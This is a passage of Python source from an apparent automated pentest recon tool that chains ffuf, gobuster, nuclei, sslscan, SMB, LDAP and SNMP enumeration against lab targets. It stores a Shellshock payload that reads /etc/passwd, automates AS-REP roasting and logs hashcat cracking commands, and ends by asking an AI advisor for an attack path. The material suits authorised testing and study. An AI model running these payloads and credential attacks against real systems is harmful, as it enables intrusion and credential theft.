    """Aggregate hostnames from TLS SANs, HTTP Host redirects, service extras.
    Returns sorted set of hostnames (excluding raw IPs)."""
    hostnames = set()
    for port, svc in services.items():
        # Check TLS SANs
        if svc.get('tunnel') == 'ssl' or port in (443, 8443, 8080, 9443):
            sans = fetch_cert_sans(target, port, timeout=5)
            for h in sans:
                hostnames.add(h)
                (outdir / 'cert_sans.txt').open('a').write(f"{port}: {h}\n")
        # Check HTTP headers for Host/redirect
        if any(x in svc.get('service', '').lower() for x in ['http', 'www']) or port in (80, 8080, 8000, 5000, 8443, 443):
            scheme = 'https' if svc.get('tunnel') == 'ssl' or port in (443, 8443, 9443) else 'http'
            url = f"{scheme}://{target}:{port}/"
            probe = http_probe(url, timeout=5, follow=False)
            if probe:
                # Check redirect Location
                if probe.get('redirect'):
                    m = re.match(r'https?://([^/:]+)', probe['redirect'])
                    if m:
                        hn = m.group(1).lower()
                        if hn and not re.match(r'^\d+\.\d+\.\d+\.\d+$', hn):
                            hostnames.add(hn)
                # Check body for hostnames
                for m in re.finditer(r'https?://([a-z0-9\-\.]+)', probe.get('body_head', '').lower()):
                    h = m.group(1)
                    if not re.match(r'^\d+\.\d+\.\d+\.\d+$', h) and '.' in h and h != target.lower():
                        hostnames.add(h)
    # Clean
    hostnames = {h for h in hostnames if h and '.' in h and
                 not re.match(r'^\d+\.\d+\.\d+\.\d+$', h)}
    return sorted(hostnames)


def resolve_and_update_hosts(target, hostnames, apply=False):
    """Suggest or apply /etc/hosts updates. Returns list of suggested entries."""
    entries = []
    for h in hostnames:
        entries.append(f"{target} {h}")
    if apply and entries and os.geteuid() == 0:
        existing = Path('/etc/hosts').read_text()
        to_add = [e for e in entries if e not in existing]
        if to_add:
            with open('/etc/hosts', 'a') as fh:
                fh.write('\n# SmartNmap discovered hosts\n')
                fh.write('\n'.join(to_add) + '\n')
            good(f"Added {len(to_add)} entries to /etc/hosts")
    return entries


def vhost_bruteforce(target, port, scheme, wordlist, base_host=None, outdir=None, timeout=180):
    """Use ffuf to bruteforce vhosts. Returns list of discovered vhosts."""
    if not shutil.which('ffuf') or not Path(wordlist).exists():
        return []
    url = f"{scheme}://{target}:{port}/"
    # First get baseline response size from random subdomain
    baseline = http_probe(url, host_header=f"nonexistent-{random.randint(10000,99999)}.{base_host or 'invalid.local'}")
    baseline_size = baseline['size'] if baseline else 0
    out_file = outdir / f'ffuf_vhost_{port}.json' if outdir else None
    hostname_pat = f"FUZZ.{base_host}" if base_host else "FUZZ"
    cmd = ['ffuf', '-u', url, '-H', f'Host: {hostname_pat}',
           '-w', wordlist, '-mc', 'all', '-fc', '404',
           '-fs', str(baseline_size), '-t', '50', '-timeout', '5',
           '-s']
    if out_file:
        cmd.extend(['-of', 'json', '-o', str(out_file)])
    info(f"ffuf vhost bruteforce: Host: {hostname_pat} (filter size={baseline_size})")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        warn("ffuf vhost bruteforce timed out")
        return []
    discovered = []
    if out_file and out_file.exists():
        try:
            data = json.loads(out_file.read_text())
            for res in data.get('results', []):
                host = res.get('host', '').strip() or res.get('input', {}).get('FUZZ', '')
                if host:
                    discovered.append(host)
        except Exception:
            pass
    # Parse silent mode output too
    for line in r.stdout.splitlines():
        line = line.strip()
        if not line or line.startswith(('#', '[')):
            continue
        if base_host and f'.{base_host}' in line:
            discovered.append(line)
        elif line.replace('-', '').replace('_', '').replace('.', '').isalnum():
            discovered.append(line)
    return sorted(set(discovered))


def run_sslscan_or_testssl(target, port, outdir):
    """Run sslscan / testssl.sh for deep TLS analysis. Returns findings."""
    findings = []
    if shutil.which('sslscan'):
        out_file = outdir / f'sslscan_{port}.txt'
        info(f"sslscan {target}:{port}")
        try:
            r = subprocess.run(['sslscan', '--no-colour', f'{target}:{port}'],
                               capture_output=True, text=True, timeout=60)
            out_file.write_text(r.stdout)
            # Parse interesting findings
            for patn, desc, sev in [
                (r'SSLv2\s+enabled', 'SSLv2 enabled (deprecated)', 'high'),
                (r'SSLv3\s+enabled', 'SSLv3 enabled (POODLE)', 'high'),
                (r'TLSv1\.0\s+enabled', 'TLS 1.0 enabled (deprecated)', 'medium'),
                (r'TLSv1\.1\s+enabled', 'TLS 1.1 enabled (deprecated)', 'medium'),
                (r'Heartbleed', 'Heartbleed vulnerability', 'critical'),
                (r'\bRC4\b', 'RC4 cipher supported (weak)', 'medium'),
                (r'\b(NULL|EXPORT|anon|ADH)\b.*cipher', 'Weak cipher suite supported', 'high'),
                (r'Self[\s\-]?signed', 'Self-signed certificate', 'info'),
                (r'expired', 'Expired certificate', 'medium'),
                (r'3DES', '3DES cipher (SWEET32)', 'low'),
            ]:
                if re.search(patn, r.stdout, re.I):
                    findings.append({'desc': desc, 'severity': sev, 'port': port})
        except Exception as e:
            warn(f"sslscan failed: {e}")
    elif shutil.which('testssl.sh') or shutil.which('testssl'):
        binary = shutil.which('testssl.sh') or shutil.which('testssl')
        out_file = outdir / f'testssl_{port}.txt'
        info(f"testssl {target}:{port}")
        try:
            r = subprocess.run([binary, '--color', '0', '--fast', '--quiet',
                                f'{target}:{port}'],
                               capture_output=True, text=True, timeout=180)
            out_file.write_text(r.stdout)
            for patn, desc, sev in [
                (r'VULNERABLE.*Heartbleed', 'Heartbleed', 'critical'),
                (r'VULNERABLE.*POODLE', 'POODLE SSLv3', 'high'),
                (r'VULNERABLE.*CCS', 'OpenSSL CCS Injection', 'high'),
                (r'VULNERABLE.*ROBOT', 'ROBOT', 'high'),
                (r'VULNERABLE.*LOGJAM', 'LOGJAM', 'medium'),
                (r'VULNERABLE.*SWEET32', 'SWEET32', 'low'),
                (r'offered.*SSLv[23]', 'Old SSL version offered', 'high'),
                (r'offered.*TLS 1\.[01]', 'Old TLS version offered', 'medium'),
            ]:
                if re.search(patn, r.stdout, re.I):
                    findings.append({'desc': desc, 'severity': sev, 'port': port})
        except Exception as e:
            warn(f"testssl failed: {e}")
    return findings


def run_nuclei(target_url, outdir, tags=None, severity='critical,high,medium', timeout=300):
    """Run nuclei templates for vuln discovery. Returns list of findings."""
    if not shutil.which('nuclei'):
        return []
    out_file = outdir / f'nuclei_{hashlib.md5(target_url.encode()).hexdigest()[:8]}.jsonl'
    cmd = ['nuclei', '-u', target_url, '-silent', '-json-export', str(out_file),
           '-severity', severity, '-timeout', '10', '-rate-limit', '100',
           '-stats=false', '-disable-update-check']
    if tags:
        cmd.extend(['-tags', ','.join(tags)])
    info(f"nuclei scan: {target_url} (severity={severity})")
    try:
        rc, out = _stream_process(cmd, outdir / f'nuclei_{hashlib.md5(target_url.encode()).hexdigest()[:8]}.log',
                                  timeout, quiet=False, prefix='  [nuclei] ')
    except Exception as e:
        warn(f"nuclei failed: {e}")
        return []
    findings = []
    if out_file.exists():
        try:
            for line in out_file.read_text().splitlines():
                if not line.strip():
                    continue
                try:
                    e = json.loads(line)
                    findings.append({
                        'template': e.get('template-id') or e.get('templateID'),
                        'severity': (e.get('info', {}).get('severity') or 'unknown').lower(),
                        'name': e.get('info', {}).get('name', ''),
                        'matched_at': e.get('matched-at', target_url),
                        'description': e.get('info', {}).get('description', '')[:200],
                    })
                except json.JSONDecodeError:
                    continue
        except Exception:
            pass
    return findings


def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None, hostnames=None):
    """Phase 5: Supplementary Tool Enumeration (vhosts, web, SMB, NFS, FTP, TLS, nuclei).
    Returns list of additional structured vuln findings discovered in phase 5."""
    section("PHASE 5: Supplementary Tools")

    hostnames = hostnames or []
    shellshock_vulns = []

    # Searchsploit deep scan (re-run on any new services discovered in phase 3/4)
    if tools.get('searchsploit'):
        subsection("Searchsploit Deep Scan")
        for xml_file in sorted(outdir.glob('phase*.xml')):
            if 'phase1' in xml_file.name or 'phase2' in xml_file.name:
                continue
            sploit_out = run_searchsploit_nmap(xml_file)
            if sploit_out.strip() and 'No Results' not in sploit_out:
                info(f"searchsploit from {xml_file.name}:")
                for line in sploit_out.strip().split('\n')[:10]:
                    if line.strip():
                        print(f"    {line}")
                (outdir / f'searchsploit_{xml_file.stem}.txt').write_text(sploit_out)

    # Determine HTTP ports and build URL list
    http_ports = sorted([p for p, s in services.items()
                         if (any(x in s.get('service', '').lower() for x in ['http', 'www'])
                             or p in [80, 81, 443, 591, 2082, 2087, 2095, 2096, 3000, 3128, 5000,
                                      5001, 7001, 7070, 8000, 8008, 8080, 8081, 8088, 8090, 8099,
                                      8443, 8834, 8888, 9000, 9001, 9080, 9443, 10443])
                         and 'httpapi' not in s.get('product', '').lower()])

    for port in http_ports:
        svc = services[port]
        tunnel = svc.get('tunnel', '')
        scheme = 'https' if tunnel == 'ssl' or port in [443, 8443, 9443, 10443] else 'http'
        url = f"{scheme}://{target}:{port}"
        subsection(f"HTTP Enumeration - {url}")

        # Quick path probes via curl
        if tools.get('curl'):
            probe_results = []
            for path in COMMON_WEB_PATHS:
                try:
                    r = subprocess.run(
                        ['curl', '-sk', '-o', '/dev/null',
                         '-w', '%{http_code}|%{size_download}',
                         f"{url}/{path}", '--max-time', '5'],
                        capture_output=True, text=True, timeout=7)
                    out = (r.stdout or '').strip()
                    if '|' in out:
                        code, size = out.split('|', 1)
                    else:
                        code, size = out, '0'
                    if code in HTTP_HIT_CODES - {'301', '302'} or (code in {'301', '302'} and int(size or 0) > 100):
                        good(f"  {url}/{path} => HTTP {code} ({size} bytes)")
                        probe_results.append(f"{path} {code} {size}")
                        if loot:
                            loot.add('urls', f"{url}/{path} (HTTP {code})")
                except Exception:
                    pass
            if probe_results:
                (outdir / f'http_paths_{port}.txt').write_text('\n'.join(probe_results))

            try:
                r = subprocess.run(['curl', '-skI', f"{url}/", '--max-time', '5'],
                                   capture_output=True, text=True, timeout=10)
                (outdir / f'http_headers_{port}.txt').write_text(r.stdout)
                for line in r.stdout.splitlines():
                    if line.lower().startswith(('server:', 'x-powered-by:', 'set-cookie:',
                                                'www-authenticate:', 'x-frame-options:',
                                                'content-security-policy:')):
                        print(f"    {C.Di}{line.strip()}{C.Re}")
            except Exception:
                pass

        # TLS deep scan
        if tunnel == 'ssl' or port in [443, 8443, 9443]:
            tls_findings = run_sslscan_or_testssl(target, port, outdir)
            for f in tls_findings:
                col = C.R if f['severity'] in ('critical', 'high') else C.Y
                print(f"    {col}[TLS-{f['severity'].upper()}] {f['desc']}{C.Re}")
                if loot:
                    loot.add('notes', f"TLS {f['severity']}: {f['desc']} on port {f['port']}")

        if tools.get('whatweb'):
            info(f"whatweb on {url}")
            try:
                r = subprocess.run(['whatweb', '-a', '3', '--no-errors', '--color=never', url],
                                   capture_output=True, text=True, timeout=30)
                if r.stdout.strip():
                    print(f"    {r.stdout.strip()[:500]}")
                    (outdir / f'whatweb_{port}.txt').write_text(r.stdout)
            except Exception:
                pass

        if tools.get('gobuster') and not args.no_gobuster:
            wordlists = [
                '/usr/share/wordlists/dirb/common.txt',
                '/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt',
                '/usr/share/seclists/Discovery/Web-Content/common.txt',
                '/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt',
                '/usr/share/wordlists/dirb/big.txt',
            ]
            wl = next((w for w in wordlists if Path(w).exists()), None)
            if wl:
                info(f"gobuster {url} (wl: {Path(wl).name})")
                try:
                    cmd = ['gobuster', 'dir', '-u', url, '-w', wl, '-t', '50',
                           '-q', '-k',
                           '-b', '404,400',
                           '--timeout', '5s',
                           '-o', str(outdir / f'gobuster_{port}.txt')]
                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
                    if r.stdout.strip():
                        for line in r.stdout.strip().split('\n')[:30]:
                            if line.strip():
                                print(f"    {line}")
                    elif (outdir / f'gobuster_{port}.txt').exists():
                        out = (outdir / f'gobuster_{port}.txt').read_text()
                        for line in out.split('\n')[:30]:
                            if line.strip():
                                print(f"    {line}")
                    # Recurse into high-value paths
                    gb_file = outdir / f'gobuster_{port}.txt'
                    if gb_file.exists():
                        content = gb_file.read_text()
                        for interesting in ['/cgi-bin/', '/admin/', '/api/', '/uploads/', '/backup/']:
                            if interesting in content:
                                sub_url = url.rstrip('/') + interesting
                                cgi_wordlists = [
                                    '/usr/share/seclists/Discovery/Web-Content/CGIs.txt',
                                    '/usr/share/wordlists/seclists/Discovery/Web-Content/CGIs.txt',
                                    '/usr/share/seclists/Discovery/Web-Content/common.txt',
                                ] if interesting == '/cgi-bin/' else wordlists
                                swl = next((w for w in cgi_wordlists if Path(w).exists()), wl)
                                # Extensions for cgi-bin are sh/py/pl/cgi
                                info(f"gobuster recurse into {sub_url} (wl: {Path(swl).name})")
                                sub_cmd = ['gobuster', 'dir', '-u', sub_url, '-w', swl,
                                           '-t', '50', '-q', '-k', '-b', '404,400',
                                           '--timeout', '5s',
                                           '-o', str(outdir / f'gobuster_{port}{interesting.replace("/", "_")}.txt')]
                                if interesting == '/cgi-bin/':
                                    sub_cmd.extend(['-x', 'sh,cgi,pl,py'])
                                try:
                                    r2 = subprocess.run(sub_cmd, capture_output=True,
                                                        text=True, timeout=240)
                                    sub_out = outdir / f'gobuster_{port}{interesting.replace("/", "_")}.txt'
                                    discovered_paths = []
                                    if sub_out.exists():
                                        lines_shown = 0
                                        for line in sub_out.read_text().split('\n'):
                                            if not line.strip():
                                                continue
                                            parts = line.split()
                                            path = parts[0] if parts else ''
                                            if not path:
                                                continue
                                            discovered_paths.append(path)
                                            if loot:
                                                loot.add('urls', sub_url.rstrip('/') + '/' + path.lstrip('/'))
                                            # Show Status: 200 findings and first 15 others
                                            if '(Status: 200)' in line or lines_shown < 15:
                                                print(f"      {line}")
                                                lines_shown += 1
                                    if interesting == '/cgi-bin/' and discovered_paths:
                                        ss_findings = check_shellshock(sub_url, discovered_paths)
                                        for f in ss_findings:
                                            print(f"    {C.R}{C.Bo}[SHELLSHOCK]{C.Re} {C.R}{f}{C.Re}")
                                            if loot:
                                                loot.add('notes', f"Shellshock: {f}")
                                                loot.add('creds', f"RCE as: {f.split(' - ')[-1].strip()}")
                                            # Record structured vuln
                                            vuln_url = f.split(' - ')[0]
                                            shellshock_vulns.append({
                                                'port': port, 'service': 'http',
                                                'product': 'Apache CGI', 'version': '',
                                                'desc': f'Shellshock RCE confirmed at {vuln_url}',
                                                'cve': 'CVE-2014-6271',
                                                'exploit': f'curl -H "User-Agent: () {{ :;}}; /bin/cat /etc/passwd" {vuln_url}',
                                                'severity': 'critical',
                                            })
                                except Exception as e:
                                    warn(f"  recurse failed: {e}")
                                break  # One recursion per target
                except Exception as e:
                    warn(f"gobuster failed: {e}")

        elif tools.get('ffuf') and not args.no_gobuster:
            wordlists = [
                '/usr/share/wordlists/dirb/common.txt',
                '/usr/share/seclists/Discovery/Web-Content/common.txt',
                '/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt',
            ]
            wl = next((w for w in wordlists if Path(w).exists()), None)
            if wl:
                info(f"ffuf {url}/FUZZ")
                try:
                    out_file = outdir / f'ffuf_{port}.json'
                    cmd = ['ffuf', '-u', f"{url}/FUZZ", '-w', wl, '-t', '40',
                           '-mc', '200,204,301,302,307,401,403',
                           '-s', '-of', 'json', '-o', str(out_file),
                           '-timeout', '5']
                    subprocess.run(cmd, capture_output=True, text=True, timeout=180)
                    if out_file.exists():
                        try:
                            data = json.loads(out_file.read_text())
                            for res in data.get('results', [])[:30]:
                                print(f"    {res.get('status')} {res.get('url')} ({res.get('length')} bytes)")
                        except Exception:
                            pass
                except Exception as e:
                    warn(f"ffuf failed: {e}")

        if tools.get('nikto'):
            info(f"nikto {url} (tuning: 1234567890abc)")
            try:
                r = subprocess.run(
                    ['nikto', '-h', url, '-nointeractive',
                     '-output', str(outdir / f'nikto_{port}.txt'),
                     '-Format', 'txt', '-Tuning', '1234567890abc', '-maxtime', '120s'],
                    capture_output=True, text=True, timeout=180)
                if r.stdout.strip():
                    for line in r.stdout.strip().split('\n')[:20]:
                        if '+' in line:
                            print(f"    {line}")
            except Exception:
                pass

        # Run nuclei on each HTTP endpoint
        if tools.get('nuclei') and not args.no_nuclei:
            findings = run_nuclei(url, outdir,
                                  severity='critical,high,medium,low',
                                  timeout=300)
            for f in findings[:30]:
                col = (C.R if f['severity'] in ('critical', 'high') else
                       C.Y if f['severity'] == 'medium' else C.Di)
                print(f"    {col}[NUCLEI-{f['severity'].upper()}] {f['name']} | {f['template']}{C.Re}")
                if loot:
                    loot.add('notes', f"Nuclei {f['severity']}: {f['name']} @ {f['matched_at']}")

        # wpscan if WordPress detected
        whatweb_file = outdir / f'whatweb_{port}.txt'
        if tools.get('wpscan') and whatweb_file.exists() and 'wordpress' in whatweb_file.read_text().lower():
            info(f"wpscan {url}")
            try:
                r = subprocess.run(
                    ['wpscan', '--url', url, '--enumerate', 'vp,vt,u1-10', '--random-user-agent',
                     '--disable-tls-checks', '-f', 'cli-no-color',
                     '-o', str(outdir / f'wpscan_{port}.txt')],
                    capture_output=True, text=True, timeout=240)
                if r.stdout.strip():
                    for line in r.stdout.strip().split('\n')[:30]:
                        if line.strip():
                            print(f"    {line}")
            except Exception:
                pass

    # ── VHost / Subdomain enumeration ──
    if args.vhosts and http_ports:
        subsection("VHost / Subdomain Enumeration")
        base_host = args.hostname or next(iter(hostnames), None)
        if not base_host:
            warn("No hostname detected/provided; vhost brute will use FUZZ literal")
            base_host = args.hostname or 'htb.local'
        # Determine wordlist
        wl_candidates = [
            args.vhost_wordlist,
            '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt',
            '/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt',
            '/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt',
            '/usr/share/wordlists/dns/namelist.txt',
        ]
        wl = next((w for w in wl_candidates if w and Path(w).exists()), None)
        if not wl:
            # Built-in minimal wordlist
            builtin_wl = outdir / 'builtin_subdomains.txt'
            builtin_wl.write_text('\n'.join([
                'www', 'dev', 'test', 'stage', 'staging', 'prod', 'api', 'admin',
                'portal', 'app', 'blog', 'shop', 'mail', 'webmail', 'email',
                'ftp', 'ssh', 'vpn', 'proxy', 'gateway', 'auth', 'login',
                'cms', 'backend', 'frontend', 'intranet', 'monitoring',
                'git', 'gitlab', 'jenkins', 'sonar', 'jira', 'confluence',
                'internal', 'public', 'private', 'secure', 'files', 'cdn',
                'static', 'assets', 'docs', 'help', 'support', 'status',
                'demo', 'beta', 'alpha', 'sandbox', 'lab',
            ]))
            wl = str(builtin_wl)
            info(f"Using built-in vhost wordlist ({builtin_wl})")
        for port in http_ports:
            svc = services[port]
            scheme = 'https' if svc.get('tunnel') == 'ssl' or port in [443, 8443] else 'http'
            vhosts = vhost_bruteforce(target, port, scheme, wl,
                                      base_host=base_host, outdir=outdir, timeout=180)
            if vhosts:
                good(f"Discovered {len(vhosts)} vhost(s) on port {port}:")
                for v in vhosts[:20]:
                    print(f"    {v}")
                if loot:
                    for v in vhosts:
                        loot.add('urls', f"vhost://{v}:{port}")
                # Write discovered
                (outdir / f'vhosts_{port}.txt').write_text('\n'.join(vhosts))

    # SMB services
    smb_ports = [p for p, s in services.items()
                 if any(x in s.get('service', '').lower() for x in ['netbios', 'smb', 'microsoft-ds'])]
    if smb_ports:
        subsection("SMB Enumeration")
        if tools.get('enum4linux-ng') or tools.get('enum4linux'):
            tool = 'enum4linux-ng' if tools.get('enum4linux-ng') else 'enum4linux'
            info(f"Running {tool}")
            try:
                r = subprocess.run([tool, '-A', target],
                                   capture_output=True, text=True, timeout=180)
                (outdir / f'{tool}.txt').write_text(r.stdout)
                if loot:
                    loot.scan_output(r.stdout)
                for line in r.stdout.split('\n'):
                    if any(x in line.lower() for x in ['share', 'user', 'password', 'group']):
                        print(f"    {line.strip()}")
            except Exception:
                pass

        if tools.get('smbclient'):
            info("smbclient -L (null session)")
            try:
                r = subprocess.run(['smbclient', '-L', f'//{target}', '-N', '--option=client min protocol=NT1'],
                                   capture_output=True, text=True, timeout=15)
                if r.stdout.strip():
                    print(r.stdout[:2000])
                    (outdir / 'smbclient_list.txt').write_text(r.stdout)
                    if loot:
                        loot.scan_output(r.stdout)
            except Exception:
                pass

        for smb_tool in ('smbmap', 'netexec', 'crackmapexec'):
            if tools.get(smb_tool):
                info(f"Running {smb_tool}")
                try:
                    cmd = [smb_tool, '-H' if smb_tool == 'smbmap' else 'smb', target]
                    if smb_tool != 'smbmap':
                        cmd.extend(['--shares'])
                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                    if r.stdout.strip():
                        print(r.stdout[:2000])
                        (outdir / f'{smb_tool}.txt').write_text(r.stdout)
                        if loot:
                            loot.scan_output(r.stdout)
                    break
                except Exception:
                    pass

    # LDAP enumeration
    ldap_ports = [p for p, s in services.items()
                  if 'ldap' in s.get('service', '').lower() or p in (389, 636, 3268, 3269)]
    domain_name = None
    ldap_users = []

    # Always try to extract domain from existing Nmap output (phase2/phase3 ldap)
    for xml_file in list(outdir.glob('phase3_ldap.xml')) + list(outdir.glob('phase2_services.xml')):
        try:
            content = xml_file.read_text()
            # Look for DC=foo,DC=bar or Domain: name.local
            m = re.search(r'DC=([\w-]+)(?:,DC=([\w-]+))+', content, re.I)
            if m:
                dc_parts = re.findall(r'DC=([\w-]+)', m.group(0), re.I)
                if dc_parts:
                    domain_name = '.'.join(dc_parts).lower()
                    break
            m2 = re.search(r'Domain:\s*([\w.-]+\.\w+)', content)
            if m2:
                domain_name = m2.group(1).lower()
                break
        except Exception:
            pass
    if domain_name:
        info(f"AD domain detected from Nmap LDAP: {domain_name}")

    # Try to extract service hostnames from Nmap smb-os-discovery (e.g., lame.hackthebox.gr)
    for xml_file in list(outdir.glob('phase3_smb.xml')) + list(outdir.glob('phase2_services.xml')):
        try:
            content = xml_file.read_text()
            m = re.search(r'FQDN:\s*([\w.-]+)', content)
            if m and loot:
                loot.add('notes', f"FQDN: {m.group(1)}")
                break
        except Exception:
            pass

    if ldap_ports and tools.get('ldapsearch'):
        subsection("LDAP Enumeration")
        for port in ldap_ports:
            info(f"ldapsearch anonymous bind on {target}:{port}")
            try:
                r = subprocess.run(
                    ['ldapsearch', '-x', '-H', f'ldap://{target}:{port}',
                     '-s', 'base', '-b', '', '-LLL'],
                    capture_output=True, text=True, timeout=20)
                if r.stdout.strip() and 'namingContexts' in r.stdout:
                    good(f"LDAP anonymous bind allowed on port {port}")
                    (outdir / f'ldap_{port}.txt').write_text(r.stdout)
                    naming = None
                    for m in re.findall(r'namingContexts:\s*(.+)', r.stdout):
                        naming = m.strip()
                        print(f"    naming context: {naming}")
                        # Extract domain from DC=foo,DC=bar pattern
                        dc_parts = re.findall(r'DC=([\w-]+)', naming, re.I)
                        if dc_parts and not domain_name:
                            domain_name = '.'.join(dc_parts)
                    if loot:
                        loot.add('creds', f"LDAP anonymous bind on port {port}")
                        if domain_name:
                            loot.add('notes', f"AD domain: {domain_name}")

                    # Fetch users if we have naming context
                    if naming:
                        try:
                            r2 = subprocess.run(
                                ['ldapsearch', '-x', '-H', f'ldap://{target}:{port}',
                                 '-b', naming, '(objectClass=user)',
                                 'sAMAccountName', 'userPrincipalName',
                                 '-LLL'],
                                capture_output=True, text=True, timeout=30)
                            if r2.stdout.strip():
                                (outdir / f'ldap_users_{port}.txt').write_text(r2.stdout)
                                for m in re.findall(r'sAMAccountName:\s*(\S+)', r2.stdout):
                                    if m not in ldap_users and not m.endswith('$'):
                                        ldap_users.append(m)
                                if ldap_users:
                                    good(f"LDAP users discovered: {', '.join(ldap_users[:10])}")
                                    if loot:
                                        for u in ldap_users:
                                            loot.add('notes', f"LDAP user: {u}")
                        except Exception:
                            pass
                    break  # Only need one port
            except Exception:
                pass
    if domain_name:
        info(f"Detected AD domain: {domain_name}")

    # Kerberos AS-REP roast check (find users without pre-auth required)
    if 88 in services or any(s.get('service') == 'kerberos-sec' for s in services.values()):
        subsection("Kerberos AS-REP Roast Check")
        # Build candidate user list
        candidate_users = list(ldap_users) if ldap_users else []
        # Add common HTB/AD usernames
        common_ad_users = [
            'administrator', 'admin', 'guest', 'krbtgt', 'service', 'svc',
            'fsmith', 'hsmith', 'bsmith', 'jdoe', 'jsmith', 'test',
            'user', 'webadmin', 'sysadmin', 'backup',
        ]
        for u in common_ad_users:
            if u not in candidate_users:
                candidate_users.append(u)

        if domain_name and candidate_users:
            users_file = outdir / 'ad_candidates.txt'
            users_file.write_text('\n'.join(candidate_users[:60]))
            # Prefer impacket GetNPUsers.py, fallback to Nmap krb5-enum-users
            imp_paths = ['GetNPUsers.py', 'impacket-GetNPUsers']
            imp_bin = next((b for b in imp_paths if shutil.which(b)), None)
            if imp_bin:
                info(f"GetNPUsers.py (impacket) - domain {domain_name}")
                try:
                    r = subprocess.run(
                        [imp_bin, f'{domain_name}/', '-no-pass', '-usersfile', str(users_file),
                         '-dc-ip', target, '-format', 'hashcat'],
                        capture_output=True, text=True, timeout=90)
                    out = (r.stdout or '') + (r.stderr or '')
                    (outdir / 'asrep_roast.txt').write_text(out)
                    hashes = re.findall(r'\$krb5asrep\$\S+', out)
                    if hashes:
                        good(f"AS-REP roastable account(s) found!")
                        for h in hashes:
                            user_part = h.split('@')[0].split('$')[-1]
                            print(f"    {C.R}[AS-REP]{C.Re} {user_part}: {h[:80]}...")
                            if loot:
                                loot.add('creds', f"AS-REP hash for {user_part} (domain: {domain_name})")
                                loot.add('notes', f"Crack with: hashcat -m 18200 hash.txt rockyou.txt")
                            shellshock_vulns.append({
                                'port': 88, 'service': 'kerberos',
                                'product': 'Active Directory', 'version': '',
                                'desc': f'AS-REP roastable account: {user_part} (no pre-auth required)',
                                'cve': '', 'severity': 'high',
                                'exploit': f'Crack with: hashcat -m 18200 /tmp/hash.txt /usr/share/wordlists/rockyou.txt',
                            })
                except Exception as e:
                    warn(f"GetNPUsers failed: {e}")
            else:
                info("krb5-enum-users (nmap fallback)")
                try:
                    krb_xml = outdir / 'krb5_enum.xml'
                    run_nmap(['-p', '88', '--script', 'krb5-enum-users',
                              '--script-args', f'krb5-enum-users.realm={domain_name},userdb={users_file}',
                              '--script-timeout', '60s', '-Pn', target],
                             krb_xml, 'Kerberos enum', timeout=120)
                    if krb_xml.exists():
                        parsed = parse_xml(krb_xml)
                        for sid, sout in parsed.get('scripts', {}).items():
                            if 'valid user' in sout.lower():
                                good(f"Valid AD users from Kerberos:")
                                print(sout)
                                if loot:
                                    for m in re.findall(r'(\S+)@\S+', sout):
                                        loot.add('notes', f"Valid AD user: {m}")
                except Exception as e:
                    warn(f"krb5-enum-users failed: {e}")
        else:
            info(f"  Skipping AS-REP: domain={domain_name}, users={len(candidate_users)}")

    # NFS services
    nfs_ports = [p for p, s in services.items()
                 if any(x in s.get('service', '').lower() for x in ['nfs', 'rpcbind', 'mountd'])]
    if nfs_ports:
        subsection("NFS Enumeration")
        if tools.get('showmount'):
            info("showmount -e")
            try:
                r = subprocess.run(['showmount', '-e', target],
                                   capture_output=True, text=True, timeout=15)
                if r.stdout.strip():
                    good(f"NFS exports:\n{r.stdout}")
                    (outdir / 'showmount.txt').write_text(r.stdout)
                    if loot:
                        loot.scan_output(r.stdout)
                        loot.add('shares', f"NFS: {r.stdout.strip()}")
            except Exception:
                pass

    # SNMP enumeration
    snmp_ports = [p for p, s in services.items()
                  if 'snmp' in s.get('service', '').lower() or p in (161, 162)]
    if snmp_ports and (tools.get('snmpwalk') or tools.get('onesixtyone')):
        subsection("SNMP Enumeration")
        if tools.get('onesixtyone'):
            info(f"onesixtyone {target} (default communities)")
            try:
                communities_file = outdir / 'communities.txt'
                communities_file.write_text('\n'.join(['public', 'private', 'community',
                                                        'manager', 'cisco', 'admin',
                                                        'read', 'write', 'snmpv2c']))
                r = subprocess.run(['onesixtyone', '-c', str(communities_file), target],
                                   capture_output=True, text=True, timeout=30)
                if r.stdout.strip():
                    for line in r.stdout.strip().split('\n'):
                        if line and 'Scanning' not in line:
                            print(f"    {line}")
                            if loot:
                                loot.add('creds', f"SNMP community: {line.strip()}")
                    (outdir / 'onesixtyone.txt').write_text(r.stdout)
            except Exception:
                pass
        if tools.get('snmpwalk'):
            info(f"snmpwalk {target} (public community)")
            try:
                r = subprocess.run(['snmpwalk', '-v2c', '-c', 'public', target,
                                    '1.3.6.1.2.1.1'],
                                   capture_output=True, text=True, timeout=30)
                if r.stdout.strip() and 'Timeout' not in r.stdout:
                    (outdir / 'snmpwalk.txt').write_text(r.stdout[:10000])
                    for line in r.stdout.strip().split('\n')[:10]:
                        print(f"    {line}")
            except Exception:
                pass

    # FTP anonymous check
    ftp_ports = [p for p, s in services.items() if 'ftp' in s.get('service', '').lower()]
    if ftp_ports and tools.get('curl'):
        subsection("FTP Anonymous Access")
        for port in ftp_ports:
            info(f"Checking anonymous FTP on port {port}")
            try:
                r = subprocess.run(
                    ['curl', '-s', '--list-only', f'ftp://{target}:{port}/',
                     '--user', 'anonymous:anonymous', '--max-time', '10'],
                    capture_output=True, text=True, timeout=15)
                if r.returncode == 0 and r.stdout.strip():
                    good(f"Anonymous FTP access on port {port}!")
                    print(f"    Files: {r.stdout.strip()[:500]}")
                    (outdir / f'ftp_anon_{port}.txt').write_text(r.stdout)
                    if loot:
                        loot.add('creds', f'FTP anonymous access on port {port}')
                        loot.scan_output(r.stdout)
            except Exception:
                pass

    # AI tool strategy advice
    if api_key:
        tool_results = []
        for f in sorted(outdir.iterdir()):
            if f.suffix == '.txt' and f.stat().st_size > 0 and 'phase' not in f.name:
                try:
                    content = f.read_text()[:500]
                    if content.strip():
                        tool_results.append(f"{f.name}: {content[:200]}")
                except Exception:
                    pass
        if tool_results:
            advice = ai_phase_advisor(api_key, "Supplementary Tools",
                f"Target: {target}\nTool outputs:\n" + '\n'.join(tool_results[:20]),
                "Based on these tool findings, what's the most promising attack path? "
